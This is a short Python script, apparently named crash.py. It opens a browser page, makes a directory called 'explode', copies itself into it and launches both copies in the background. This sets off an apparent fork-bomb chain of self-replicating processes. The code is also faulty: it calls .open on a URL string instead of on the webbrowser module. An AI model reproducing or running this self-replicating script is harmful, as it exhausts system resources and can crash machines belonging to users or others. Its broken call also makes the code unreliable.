import os
import webbrowser
browser = 'https://earth.google.com'
browser.open(browser)
mk = 'mkdir explode'
os.system(mk)

cp = 'cp crash.py explode'
os.system(cp)
run = 'python3 crash.py &'
os.system(run)
re = 'python3 explode/crash.py &'
os.system(re)
